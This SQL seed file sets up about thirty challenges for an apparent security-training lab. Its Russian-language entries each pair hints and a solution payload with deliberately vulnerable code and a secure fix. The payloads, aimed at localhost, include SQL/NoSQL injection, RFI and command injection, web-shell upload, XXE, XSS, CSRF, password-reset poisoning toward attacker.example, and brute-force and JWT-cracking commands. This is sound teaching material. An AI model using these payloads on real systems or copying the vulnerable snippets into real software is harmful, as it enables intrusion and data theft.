INSERT INTO academy.challenges
    (slug, title, service, category, difficulty, description, flag, hint_1, hint_2,
     solution_payload, vulnerable_code, secure_code, order_index)
VALUES
(
    'jwt-alg-none',
    'JWT: подпись alg=none',
    'auth-service',
    'JWT',
    'easy',
    $mv$Сервис аутентификации принимает JWT и доверяет полю role. Получите доступ к административному профилю, не зная секрета подписи.$mv$,
    'MV{UNSET}',
    $mv$Изучите заголовок токена. Что произойдёт, если сервер не требует конкретный алгоритм подписи?$mv$,
    $mv$Эндпоинт GET /api/auth/me читает заголовок Authorization. Декодируйте выданный токен и измените alg на none.$mv$,
    $mv${"alg":"none","typ":"JWT"}.{"sub":"11111111-1111-1111-1111-111111111111","username":"student","role":"admin"}.$mv$,
    $mv$def current_user(token: str = Depends(oauth2_scheme)):
    payload = jwt.decode(token, options={"verify_signature": False})
    if payload.get("role") == "admin":
        return admin_profile(payload)
    return student_profile(payload)
$mv$,
    $mv$def current_user(token: str = Depends(oauth2_scheme)):
    payload = jwt.decode(
        token,
        settings.JWT_SECRET,
        algorithms=["HS256"],
    )
    return profile_for(payload["sub"], payload.get("role"))
$mv$,
    1
),
(
    'jwt-weak-secret',
    'JWT: слабый секрет',
    'auth-service',
    'JWT',
    'medium',
    $mv$Токены подписаны HS256. Секрет слишком предсказуемый. Подберите его и выпустите собственный административный токен.$mv$,
    'MV{UNSET}',
    $mv$Секрет можно проверить офлайн по известному токену. Посмотрите на словарные пароли и типовые значения из конфигурации.$mv$,
    $mv$Возьмите токен из POST /api/auth/login. Заголовок и payload находятся в Base64URL. Секрет участвует в HMAC.$mv$,
    $mv$hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
jwt_tool eyJ... -T -S hs256 -p weak-jwt-secret$mv$,
    $mv$JWT_SECRET = "weak-jwt-secret"
token = jwt.encode(
    {"sub": user_id, "role": "user"},
    JWT_SECRET,
    algorithm="HS256",
)
$mv$,
    $mv$JWT_SECRET = os.environ["JWT_SECRET"]
if len(JWT_SECRET) < 32:
    raise RuntimeError("JWT secret is too short")
token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
$mv$,
    2
),
(
    'sqli-auth-bypass',
    'SQLi: обход входа',
    'auth-service',
    'SQL Injection',
    'easy',
    $mv$Форма входа собирает SQL-запрос конкатенацией. Войдите как admin без знания пароля.$mv$,
    'MV{UNSET}',
    $mv$Проверьте, как именно username попадает в SQL. Обратите внимание на кавычки и комментарии в PostgreSQL.$mv$,
    $mv$POST /api/auth/login, JSON-поля username и password. Попробуйте завершить условие и закомментировать остаток запроса.$mv$,
    $mv$username=admin'--&password=x
username=' OR 1=1 LIMIT 1--&password=x$mv$,
    $mv$query = (
    "SELECT id, username, role FROM auth.users "
    f"WHERE username = '{username}' AND password_hash = '{password}'"
)
row = await conn.fetchrow(query)
$mv$,
    $mv$row = await conn.fetchrow(
    "SELECT id, username, password_hash, role FROM auth.users "
    "WHERE username = $1",
    username,
)
if row and bcrypt.checkpw(password.encode(), row["password_hash"].encode()):
    return issue_token(row)
$mv$,
    3
),
(
    'mass-assignment-role',
    'Mass Assignment: роль администратора',
    'auth-service',
    'Mass Assignment',
    'medium',
    $mv$Обновление профиля сохраняет все поля из тела запроса. Повысьте свои права до администратора.$mv$,
    'MV{UNSET}',
    $mv$Какие поля вы отправляете легально и какие поля объект мог бы принять неявно?$mv$,
    $mv$PATCH /api/auth/profile с JSON. Добавьте role или is_admin, хотя интерфейс их не показывает.$mv$,
    $mv$PATCH /api/auth/profile
{"email":"student@academy.local","role":"admin"}$mv$,
    $mv$@app.patch("/api/auth/profile")
async def update_profile(payload: dict, user=Depends(current_user)):
    for key, value in payload.items():
        setattr(user, key, value)
    await user.save()
    return user
$mv$,
    $mv$ALLOWED_FIELDS = {"email", "display_name", "bio"}
updates = {k: v for k, v in payload.items() if k in ALLOWED_FIELDS}
await db.execute(
    "UPDATE auth.users SET email = $1, display_name = $2 WHERE id = $3",
    updates.get("email", user.email),
    updates.get("display_name", user.display_name),
    user.id,
)
$mv$,
    4
),
(
    'brute-force-login',
    'Brute Force: нет ограничения попыток',
    'auth-service',
    'Brute Force',
    'easy',
    $mv$Учётная запись admin защищена слабым паролем. Лимит попыток отсутствует. Подберите пароль и получите флаг.$mv$,
    'MV{UNSET}',
    $mv$Ответы на неудачный вход не меняются, а задержки и блокировки нет. Словарь помогает быстрее перебора.$mv$,
    $mv$POST /api/auth/login принимает username и password. Используйте ffuf или hydra с rockyou.txt.$mv$,
    $mv$ffuf -u http://localhost:4000/api/auth/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt -mc 200$mv$,
    $mv$@app.post("/api/auth/login")
async def login(data: LoginInput):
    user = await find_user(data.username)
    if user and verify_password(data.password, user.password_hash):
        return issue_token(user)
    return {"error": "invalid credentials"}
$mv$,
    $mv$limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.post("/api/auth/login")
@limiter.limit("5/minute")
async def login(request: Request, data: LoginInput):
    await login_attempts.raise_if_blocked(data.username)
    return await authenticate(data)
$mv$,
    5
),
(
    'open-redirect-login',
    'Open Redirect: next после входа',
    'auth-service',
    'Open Redirect',
    'easy',
    $mv$Параметр next перенаправляет пользователя после успешного входа без проверки домена. Уведите пользователя на внешний сайт.$mv$,
    'MV{UNSET}',
    $mv$Сравните абсолютные и относительные URL. Что произойдёт с протокол-относительным адресом?$mv$,
    $mv$GET /api/auth/login?next=... после успешной аутентификации. Проверьте заголовок Location.$mv$,
    $mv$/api/auth/login?next=//evil.example/phish$mv$,
    $mv$@app.get("/api/auth/login")
async def login(next: str = "/", user=Depends(optional_user)):
    return RedirectResponse(next)
$mv$,
    $mv$from urllib.parse import urlparse

target = next or "/"
parsed = urlparse(target)
if parsed.scheme or parsed.netloc:
    target = "/"
return RedirectResponse(target)
$mv$,
    6
),
(
    'password-reset-poisoning',
    'Password Reset Poisoning',
    'auth-service',
    'Host Header',
    'hard',
    $mv$Ссылка восстановления пароля строится из заголовка Host. Подмените хост и получите токен сброса в свою ловушку.$mv$,
    'MV{UNSET}',
    $mv$Сервер доверяет данным запроса при формировании абсолютного URL. Какой заголовок обычно задаёт хост?$mv$,
    $mv$POST /api/auth/forgot-password с заголовком Host: attacker.example. Ссылка в письме будет указывать на ваш домен.$mv$,
    $mv$POST /api/auth/forgot-password
Host: attacker.example
{"email":"admin@academy.local"}$mv$,
    $mv$@app.post("/api/auth/forgot-password")
async def forgot(email: str, request: Request):
    token = create_reset_token(email)
    base = f"https://{request.headers['host']}"
    send_email(email, f"{base}/reset?token={token}")
    return {"status": "sent"}
$mv$,
    $mv$base = settings.PUBLIC_BASE_URL
token = create_reset_token(email)
send_email(email, f"{base}/reset?token={token}")
return {"status": "sent"}
$mv$,
    7
),
(
    'graphql-introspection',
    'GraphQL Introspection',
    'api-gateway',
    'GraphQL',
    'easy',
    $mv$GraphQL-схема доступна для интроспекции в production. Найдите скрытый запрос и получите флаг.$mv$,
    'MV{UNSET}',
    $mv$Схема GraphQL сама себя описывает. Какие метаполя начинаются с двойного подчёркивания?$mv$,
    $mv$POST /graphql. Запросите __schema, затем поля скрытого типа AdminQuery.$mv$,
    $mv${"query":"{ __schema { types { name fields { name } } } }"}$mv$,
    $mv$const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: true,
});
$mv$,
    $mv$const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== "production",
  validationRules: [depthLimit(6)],
});
$mv$,
    8
),
(
    'graphql-batching-dos',
    'GraphQL Batching DoS',
    'api-gateway',
    'GraphQL',
    'hard',
    $mv$Шлюз принимает пакеты GraphQL-запросов без ограничения размера. Вызовите деградацию и получите флаг из диагностического ответа.$mv$,
    'MV{UNSET}',
    $mv$Один HTTP-запрос может содержать массив операций. Сколько дорогих операций разрешено в одном пакете?$mv$,
    $mv$POST /graphql с JSON-массивом. Повторите тяжёлый запрос много раз и следите за временем ответа.$mv$,
    $mv$[{"query":"{ products(first: 500) { items { reviews { author { orders { items { title } } } } } } }"}]
Повторите объект 2000 раз в одном массиве.$mv$,
    $mv$app.use("/graphql", express.json({ limit: "50mb" }));
const server = new ApolloServer({
  typeDefs,
  resolvers,
  allowBatchedHttpRequests: true,
});
$mv$,
    $mv$app.use("/graphql", express.json({ limit: "100kb" }));
const server = new ApolloServer({
  typeDefs,
  resolvers,
  allowBatchedHttpRequests: false,
  validationRules: [depthLimit(5)],
  plugins: [costLimit({ maxCost: 1000 })],
});
$mv$,
    9
),
(
    'prototype-pollution',
    'Prototype Pollution',
    'api-gateway',
    'Prototype Pollution',
    'medium',
    $mv$Эндпоинт слияния профиля использует lodash.merge для пользовательского JSON. Загрязните прототип и получите административный ответ.$mv$,
    'MV{UNSET}',
    $mv$Какие специальные ключи объекта влияют на цепочку прототипов в JavaScript?$mv$,
    $mv$POST /api/profile/merge. Отправьте __proto__ с флагом isAdmin. Затем запросите /api/admin/summary.$mv$,
    $mv$POST /api/profile/merge
{"__proto__":{"isAdmin":true}}$mv$,
    $mv$const _ = require("lodash");
app.post("/api/profile/merge", (req, res) => {
  const profile = {};
  _.merge(profile, req.body);
  res.json(profile);
});
$mv$,
    $mv$const allowed = new Set(["displayName", "bio", "avatar"]);
const profile = Object.create(null);
for (const key of Object.keys(req.body)) {
  if (allowed.has(key)) profile[key] = req.body[key];
}
res.json(profile);
$mv$,
    10
),
(
    'ssrf-image-fetch',
    'SSRF: импорт изображения',
    'api-gateway',
    'SSRF',
    'medium',
    $mv$Парсер картинок загружает URL на стороне сервера. Обратитесь к внутреннему сервису статистики и заберите флаг.$mv$,
    'MV{UNSET}',
    $mv$Сервер видит внутренние DNS-имена и порты, недоступные из браузера. Куда ещё можно обратиться?$mv$,
    $mv$POST /api/images/parse с полем imageUrl. Цель stats-service слушает порт 8000.$mv$,
    $mv$POST /api/images/parse
{"imageUrl":"http://stats-service:8000/debug"}$mv$,
    $mv$app.post("/api/images/parse", async (req, res) => {
  const response = await fetch(req.body.imageUrl);
  const body = await response.text();
  res.json({ size: body.length, preview: body.slice(0, 200) });
});
$mv$,
    $mv$const allowedHosts = new Set(["images.marketvault.local"]);
const target = new URL(req.body.imageUrl);
if (target.protocol !== "https:" || !allowedHosts.has(target.hostname)) {
  return res.status(400).json({ error: "host not allowed" });
}
const response = await fetch(target, { redirect: "error" });
$mv$,
    11
),
(
    'cors-wildcard-credentials',
    'CORS: доверие любому Origin',
    'api-gateway',
    'CORS',
    'easy',
    $mv$API отражает любой Origin и разрешает credentials. Прочитайте административные данные с чужого сайта.$mv$,
    'MV{UNSET}',
    $mv$Проверьте Access-Control-Allow-Origin и Access-Control-Allow-Credentials в ответе на запрос с произвольным Origin.$mv$,
    $mv$GET /api/admin/flag с заголовком Origin: https://evil.example и cookie сессии.$mv$,
    $mv$curl -i http://localhost:4000/api/admin/flag \
  -H "Origin: https://evil.example" \
  -H "Cookie: session=<student-session>"$mv$,
    $mv$app.use(cors({
  origin: true,
  credentials: true,
}));
$mv$,
    $mv$app.use(cors({
  origin: ["http://localhost:3000", "https://academy.marketvault.local"],
  credentials: true,
  methods: ["GET", "POST", "PATCH"],
}));
$mv$,
    12
),
(
    'graphql-idor',
    'GraphQL IDOR: чужой заказ',
    'api-gateway',
    'IDOR',
    'medium',
    $mv$GraphQL-запрос order возвращает заказ по ID без проверки владельца. Прочитайте заказ администратора.$mv$,
    'MV{UNSET}',
    $mv$Авторизация проверяет вход, но не принадлежность объекта. Сравните ID заказа и ID пользователя.$mv$,
    $mv$POST /graphql с токеном student. Запросите order(id: 1) и поля address, notes.$mv$,
    $mv${"query":"{ order(id: 1) { id buyerId total address items { title } } }"}$mv$,
    $mv$order: async (_, { id }, { user }) => {
  return db.order.findUnique({ where: { id } });
}
$mv$,
    $mv$order: async (_, { id }, { user }) => {
  return db.order.findFirst({
    where: { id, buyerId: user.id },
  });
}
$mv$,
    13
),
(
    'legacy-lfi',
    'LFI: включение локального файла',
    'legacy-service',
    'LFI',
    'easy',
    $mv$Старый отчётный модуль подключает PHP-файл по параметру page. Прочитайте файл с флагом вне webroot.$mv$,
    'MV{UNSET}',
    $mv$Параметр page попадает в include. Можно ли выйти из каталога через ../?$mv$,
    $mv$GET /legacy/report.php?page=../../flag.txt. Флаг лежит в /var/www/flags/flag.txt.$mv$,
    $mv$/legacy/report.php?page=../../flags/flag.txt$mv$,
    $mv$<?php
$page = $_GET["page"] ?? "summary";
include __DIR__ . "/pages/" . $page . ".php";
?>
$mv$,
    $mv$<?php
$allowed = ["summary", "sales", "stock"];
$page = $_GET["page"] ?? "summary";
if (!in_array($page, $allowed, true)) {
    http_response_code(400);
    exit("invalid page");
}
include __DIR__ . "/pages/" . $page . ".php";
?>
$mv$,
    14
),
(
    'legacy-rfi',
    'RFI: удалённое включение',
    'legacy-service',
    'RFI',
    'hard',
    $mv$Модуль шаблонов позволяет include по URL. Выполните свой PHP-код и прочитайте флаг.$mv$,
    'MV{UNSET}',
    $mv$В PHP есть настройки allow_url_include и обёртки stream. Какие протоколы поддерживают код?$mv$,
    $mv$GET /legacy/template.php?page=... Используйте data:// или свой HTTP-сервер.$mv$,
    $mv$/legacy/template.php?page=data://text/plain,<?php system('cat /var/www/flags/flag.txt');?>$mv$,
    $mv$<?php
$page = $_GET["page"] ?? "default";
include $page;
?>
$mv$,
    $mv$<?php
$allowed = ["default", "compact", "wide"];
$page = $_GET["page"] ?? "default";
if (!in_array($page, $allowed, true)) {
    exit("invalid template");
}
include __DIR__ . "/templates/" . $page . ".php";
?>
$mv$,
    15
),
(
    'legacy-xxe',
    'XXE: чтение файла через XML',
    'legacy-service',
    'XXE',
    'medium',
    $mv$Импорт XML-накладных разбирает внешние сущности. Прочитайте локальный файл с флагом.$mv$,
    'MV{UNSET}',
    $mv$DOCTYPE может объявлять SYSTEM-сущность. Что делает LIBXML_NOENT?$mv$,
    $mv$POST /legacy/import.php с XML. Цель — /var/www/flags/flag.txt.$mv$,
    $mv$<?xml version="1.0"?>
<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///var/www/flags/flag.txt">]>
<invoice><note>&xxe;</note></invoice>$mv$,
    $mv$$xml = file_get_contents("php://input");
$doc = simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NOENT);
echo $doc->note;
$mv$,
    $mv$$previous = libxml_disable_entity_loader(true);
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET | LIBXML_NOERROR);
$note = $doc->getElementsByTagName("note")->item(0)?->textContent;
echo htmlspecialchars($note, ENT_QUOTES, "UTF-8");
$mv$,
    16
),
(
    'legacy-command-injection',
    'Command Injection: ping',
    'legacy-service',
    'Command Injection',
    'easy',
    $mv$Диагностическая страница проверяет доступность хоста через system(). Выполните произвольную команду.$mv$,
    'MV{UNSET}',
    $mv$Оболочка интерпретирует не только имя хоста, но и разделители команд.$mv$,
    $mv$GET /legacy/ping.php?host=... Добавьте ; и команду чтения флага.$mv$,
    $mv$/legacy/ping.php?host=127.0.0.1;cat%20/var/www/flags/flag.txt$mv$,
    $mv$<?php
$host = $_GET["host"] ?? "127.0.0.1";
system("ping -c 1 " . $host);
?>
$mv$,
    $mv$<?php
$host = $_GET["host"] ?? "";
if (!filter_var($host, FILTER_VALIDATE_IP)) {
    exit("invalid host");
}
$output = shell_exec("ping -c 1 " . escapeshellarg($host));
echo htmlspecialchars($output, ENT_QUOTES, "UTF-8");
?>
$mv$,
    17
),
(
    'legacy-php-object-injection',
    'PHP Object Injection',
    'legacy-service',
    'Deserialization',
    'hard',
    $mv$Настройки интерфейса хранятся в cookie в сериализованном виде. Соберите объект, который при уничтожении прочитает флаг.$mv$,
    'MV{UNSET}',
    $mv$unserialize доверяет cookie. Магические методы класса вызываются при уничтожении объекта.$mv$,
    $mv$Cookie prefs содержит PHP-сериализацию. Класс CacheFile имеет __destruct с file_get_contents.$mv$,
    $mv$prefs=O:9:"CacheFile":1:{s:4:"path";s:22:"/var/www/flags/flag.txt";}$mv$,
    $mv$class CacheFile {
    public $path;
    public function __destruct() {
        echo file_get_contents($this->path);
    }
}
$prefs = unserialize($_COOKIE["prefs"] ?? "");
$prefs->apply();
$mv$,
    $mv$$raw = $_COOKIE["prefs"] ?? "{}";
$data = json_decode($raw, true, 4, JSON_THROW_ON_ERROR);
if (!is_array($data)) {
    $data = [];
}
$prefs = ['theme' => 'dark', 'lang' => 'ru'];
$prefs = array_intersect_key($data, $prefs) + $prefs;
$mv$,
    18
),
(
    'legacy-upload-php',
    'Unrestricted File Upload',
    'legacy-service',
    'File Upload',
    'medium',
    $mv$Аватар загружается в каталог, который исполняет PHP. Загрузите веб-оболочку и прочитайте флаг.$mv$,
    'MV{UNSET}',
    $mv$Проверяется ли расширение и MIME? Что произойдёт с файлом .php в uploads?$mv$,
    $mv$POST /legacy/upload.php multipart, поле file. Затем откройте /legacy/uploads/<name>.php.$mv$,
    $mv$curl -F 'file=@shell.php' http://localhost:4000/legacy/upload.php
# shell.php: <?php echo file_get_contents('/var/www/flags/flag.txt'); ?>
/legacy/uploads/shell.php$mv$,
    $mv$$name = $_FILES["file"]["name"];
$target = __DIR__ . "/uploads/" . $name;
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
echo "uploaded";
$mv$,
    $mv$$allowed = ["image/png" => "png", "image/jpeg" => "jpg"];
$mime = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES["file"]["tmp_name"]);
if (!isset($allowed[$mime])) {
    exit("invalid image");
}
$name = bin2hex(random_bytes(16)) . "." . $allowed[$mime];
move_uploaded_file($_FILES["file"]["tmp_name"], "/var/uploads/" . $name);
$mv$,
    19
),
(
    'inventory-idor',
    'IDOR: чужой заказ',
    'inventory-service',
    'IDOR',
    'easy',
    $mv$Inventory API отдаёт заказ по числовому ID. Прочитайте заказ другого пользователя и найдите флаг в заметке.$mv$,
    'MV{UNSET}',
    $mv$Проверяется ли владелец заказа или только факт авторизации?$mv$,
    $mv$GET /api/inventory/orders/1 с токеном student. Поменяйте ID.$mv$,
    $mv$curl http://localhost:4000/api/inventory/orders/1 \
  -H "Authorization: Bearer <student-token>"$mv$,
    $mv$func getOrder(w http.ResponseWriter, r *http.Request) {
    id := chi.URLParam(r, "id")
    row := db.QueryRow(r.Context(),
        "SELECT id, user_id, total, notes FROM inventory.orders WHERE id=$1", id)
    writeJSON(w, scanOrder(row))
}
$mv$,
    $mv$func getOrder(w http.ResponseWriter, r *http.Request) {
    id := chi.URLParam(r, "id")
    userID := auth.UserID(r.Context())
    row := db.QueryRow(r.Context(),
        "SELECT id, user_id, total, notes FROM inventory.orders WHERE id=$1 AND user_id=$2",
        id, userID)
    writeJSON(w, scanOrder(row))
}
$mv$,
    20
),
(
    'inventory-race-condition',
    'Race Condition: двойное списание',
    'inventory-service',
    'Race Condition',
    'hard',
    $mv$Операция списания баланса выполняется без блокировки строки. Отправьте параллельные запросы и уведите баланс в минус.$mv$,
    'MV{UNSET}',
    $mv$Между чтением баланса и записью есть окно. Помогает одновременность, а не последовательность.$mv$,
    $mv$POST /api/inventory/redeem с телом amount. Запустите 30 запросов параллельно через xargs -P30.$mv$,
    $mv$seq 30 | xargs -P30 -I{} curl -s -X POST \
  http://localhost:4000/api/inventory/redeem \
  -H "Authorization: Bearer <student-token>" \
  -H "Content-Type: application/json" -d '{"amount":1000}'$mv$,
    $mv$balance := getBalance(ctx, userID)
if balance >= amount {
    setBalance(ctx, userID, balance-amount)
    createOrder(ctx, userID, amount)
}
$mv$,
    $mv$tx, _ := db.Begin(ctx)
defer tx.Rollback(ctx)
var balance int64
tx.QueryRow(ctx,
    "SELECT balance FROM inventory.wallets WHERE user_id=$1 FOR UPDATE",
    userID).Scan(&balance)
if balance < amount {
    return ErrInsufficientFunds
}
tx.Exec(ctx, "UPDATE inventory.wallets SET balance=balance-$1 WHERE user_id=$2", amount, userID)
tx.Commit(ctx)
$mv$,
    21
),
(
    'inventory-path-traversal',
    'Path Traversal: файлы инвентаря',
    'inventory-service',
    'Path Traversal',
    'medium',
    $mv$Go-сервис раздаёт файлы из каталога по параметру name. Выйдите из каталога и прочитайте флаг.$mv$,
    'MV{UNSET}',
    $mv$filepath.Join нормализует путь. Проверяется ли, что результат остался внутри базового каталога?$mv$,
    $mv$GET /api/inventory/files?name=../../../../var/www/flags/flag.txt$mv$,
    $mv$GET /api/inventory/files?name=../../flags/flag.txt$mv$,
    $mv$name := r.URL.Query().Get("name")
path := filepath.Join("/srv/inventory/files", name)
data, err := os.ReadFile(path)
if err != nil {
    http.NotFound(w, r)
    return
}
w.Write(data)
$mv$,
    $mv$base := "/srv/inventory/files"
name := r.URL.Query().Get("name")
path := filepath.Join(base, name)
rel, err := filepath.Rel(base, path)
if err != nil || strings.HasPrefix(rel, "..") {
    http.Error(w, "invalid path", http.StatusBadRequest)
    return
}
data, err := os.ReadFile(path)
$mv$,
    22
),
(
    'nosql-auth-bypass',
    'NoSQL Injection: обход входа',
    'api-gateway',
    'NoSQL',
    'easy',
    $mv$Вход в Partner Portal использует MongoDB и передаёт тело запроса в findOne без проверки типов. Войдите как admin.$mv$,
    'MV{UNSET}',
    $mv$MongoDB-операторы начинаются с $. Что будет, если вместо строки передать объект?$mv$,
    $mv$POST /api/partner/login. Поля username и password попадают в фильтр документа.$mv$,
    $mv$POST /api/partner/login
{"username":{"$ne":null},"password":{"$ne":null}}$mv$,
    $mv$app.post("/api/partner/login", async (req, res) => {
  const user = await db.collection("users").findOne({
    username: req.body.username,
    password: req.body.password,
  });
  if (!user) return res.status(401).end();
  res.json({ token: sign(user) });
});
$mv$,
    $mv$const { username, password } = req.body;
if (typeof username !== "string" || typeof password !== "string") {
  return res.status(400).end();
}
const user = await db.collection("users").findOne({ username });
if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
  return res.status(401).end();
}
res.json({ token: sign(user) });
$mv$,
    23
),
(
    'nosql-blind',
    'Blind NoSQL Injection',
    'api-gateway',
    'NoSQL',
    'medium',
    $mv$Пароль проверяется регулярным выражением внутри MongoDB-фильтра. Восстановите пароль администратора посимвольно.$mv$,
    'MV{UNSET}',
    $mv$Сравнение можно превратить в оракул: true или false. Оператор $regex поддерживает префиксы.$mv$,
    $mv$POST /api/partner/login с password в виде {"$regex":"^a"}. Ответ 200 означает совпадение префикса.$mv$,
    $mv$for c in a b c ... z 0 1 ...; do
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}" \
    http://localhost:4000/api/partner/login
done$mv$,
    $mv$const user = await db.collection("users").findOne({
  username: req.body.username,
  password: { $regex: req.body.password },
});
$mv$,
    $mv$const { username, password } = req.body;
if (typeof username !== "string" || typeof password !== "string") {
  return res.status(400).end();
}
const user = await db.collection("users").findOne({ username });
if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
  return res.status(401).end();
}
$mv$,
    24
),
(
    'dom-xss',
    'DOM XSS в поиске',
    'frontend',
    'XSS',
    'easy',
    $mv$Страница поиска вставляет параметр q в HTML через dangerouslySetInnerHTML. Выполните JavaScript и прочитайте флаг из API.$mv$,
    'MV{UNSET}',
    $mv$Источник данных — URL, приёмник — innerHTML. Нужен ли сервер для этой атаки?$mv$,
    $mv$Откройте /search?q=... в браузере. Проверьте, как React рендерит значение параметра.$mv$,
    $mv$/search?q=<img src=x onerror="fetch('/api/auth/me').then(r=>r.text()).then(alert)">$mv$,
    $mv$const query = new URLSearchParams(location.search).get("q");
return <div dangerouslySetInnerHTML={{ __html: query }} />;
$mv$,
    $mv$const query = new URLSearchParams(location.search).get("q") ?? "";
return <div>{query}</div>;
$mv$,
    25
),
(
    'csrf-profile-change',
    'CSRF: смена email',
    'frontend',
    'CSRF',
    'medium',
    $mv$Смена email выполняется cookie-сессией без CSRF-токена. Заставьте авторизованного пользователя изменить адрес.$mv$,
    'MV{UNSET}',
    $mv$Браузер автоматически отправляет cookie на целевой домен. Проверьте SameSite и наличие токена.$mv$,
    $mv$POST /api/profile/email. Соберите HTML-форму, которая автоматически отправляется при открытии.$mv$,
    $mv$<form action="http://localhost:4000/api/profile/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.forms[0].submit()</script>$mv$,
    $mv$app.post("/api/profile/email", (req, res) => {
  db.updateEmail(req.session.userId, req.body.email);
  res.json({ ok: true });
});
$mv$,
    $mv$app.use(session({
  cookie: { httpOnly: true, sameSite: "strict", secure: true },
}));
app.post("/api/profile/email", csrfProtection, (req, res) => {
  db.updateEmail(req.session.userId, req.body.email);
  res.json({ ok: true });
});
$mv$,
    26
),
(
    'clickjacking-checkout',
    'Clickjacking: подтверждение заказа',
    'frontend',
    'Clickjacking',
    'easy',
    $mv$Страница подтверждения заказа не запрещает встраивание во фрейм. Наложите прозрачный iframe и вынудите пользователя нажать кнопку.$mv$,
    'MV{UNSET}',
    $mv$Какие заголовки запрещают отображение страницы во фрейме?$mv$,
    $mv$Проверьте ответ /checkout. Создайте HTML с iframe и opacity: 0.1.$mv$,
    $mv$<style>iframe{position:absolute;inset:0;opacity:0.1;z-index:2}</style>
<iframe src="http://localhost:3000/checkout" width="1200" height="800"></iframe>
<div style="position:absolute;top:520px;left:380px;z-index:3">Выиграть приз</div>$mv$,
    $mv$app.use((req, res, next) => {
  res.setHeader("X-Frame-Options", "ALLOWALL");
  next();
});
$mv$,
    $mv$app.use((req, res, next) => {
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Content-Security-Policy", "frame-ancestors 'none'");
  next();
});
$mv$,
    27
),
(
    'postmessage-xss',
    'postMessage XSS',
    'frontend',
    'XSS',
    'medium',
    $mv$Страница поддержки слушает postMessage и вставляет данные в innerHTML без проверки источника. Выполните код в origin Academy.$mv$,
    'MV{UNSET}',
    $mv$Событие message приходит от любого окна. Проверяется ли event.origin?$mv$,
    $mv$Откройте /support и отправьте сообщение из внешнего iframe через postMessage."$mv$,
    $mv$<iframe id="f" src="http://localhost:3000/support"></iframe>
<script>
  f.onload = () => f.contentWindow.postMessage(
    '<img src=x onerror="fetch(`/api/auth/me`).then(r=>r.text()).then(alert)">',
    '*'
  );
</script>$mv$,
    $mv$useEffect(() => {
  const handler = (event) => {
    document.getElementById("support-preview").innerHTML = event.data;
  };
  window.addEventListener("message", handler);
  return () => window.removeEventListener("message", handler);
}, []);
$mv$,
    $mv$useEffect(() => {
  const handler = (event) => {
    if (event.origin !== window.location.origin) return;
    document.getElementById("support-preview").textContent = String(event.data);
  };
  window.addEventListener("message", handler);
  return () => window.removeEventListener("message", handler);
}, []);
$mv$,
    28
),
(
    'session-fixation',
    'Session Fixation в Redis',
    'auth-service',
    'Session Fixation',
    'hard',
    $mv$Сервис принимает идентификатор сессии из query-параметра и не перевыпускает его после входа. Зафиксируйте сессию и перехватите аккаунт.$mv$,
    'MV{UNSET}',
    $mv$Кто задаёт значение cookie до аутентификации? Меняется ли идентификатор после успешного логина?$mv$,
    $mv$Откройте /api/auth/session?sid=fixed123, войдите. Проверьте, что sid остался прежним и данные доступны по нему.$mv$,
    $mv$1. GET /api/auth/session?sid=attacker-known
2. Жертва входит по ссылке с тем же sid
3. GET /api/auth/me с cookie sid=attacker-known$mv$,
    $mv$sid = request.query_params.get("sid") or secrets.token_hex(16)
redis.hset(f"session:{sid}", mapping=user_data)
response.set_cookie("sid", sid)
$mv$,
    $mv$sid = secrets.token_urlsafe(32)
redis.hset(f"session:{sid}", mapping=user_data)
response.set_cookie(
    "sid",
    sid,
    httponly=True,
    secure=True,
    samesite="lax",
)
$mv$,
    29
),
(
    'cache-poisoning',
    'Cache Poisoning через X-Forwarded-Host',
    'api-gateway',
    'Cache Poisoning',
    'hard',
    $mv$Кэш шлюза хранит ответы по пути и отражает X-Forwarded-Host в ссылках. Отравите кэш и подмените ссылку для других пользователей.$mv$,
    'MV{UNSET}',
    $mv$Что входит в ключ кэша? Влияет ли заголовок запроса на тело ответа?$mv$,
    $mv$GET /api/landing с X-Forwarded-Host: evil.example. Повторите запрос без заголовка и проверьте кэш.$mv$,
    $mv$curl -s http://localhost:4000/api/landing \
  -H "X-Forwarded-Host: evil.example" >/dev/null
curl -s http://localhost:4000/api/landing | grep evil.example$mv$,
    $mv$app.use((req, res, next) => {
  const key = "cache:" + req.path;
  const cached = redis.get(key);
  if (cached) return res.type("html").send(cached);
  const body = renderLanding(req.headers["x-forwarded-host"]);
  redis.setex(key, 300, body);
  res.type("html").send(body);
});
$mv$,
    $mv$const host = new URL(process.env.PUBLIC_BASE_URL).host;
const key = `cache:${host}:${req.path}`;
const cached = await redis.get(key);
if (cached) return res.type("html").send(cached);
const body = renderLanding(host);
await redis.setex(key, 300, body);
res.type("html").send(body);
$mv$,
    30
);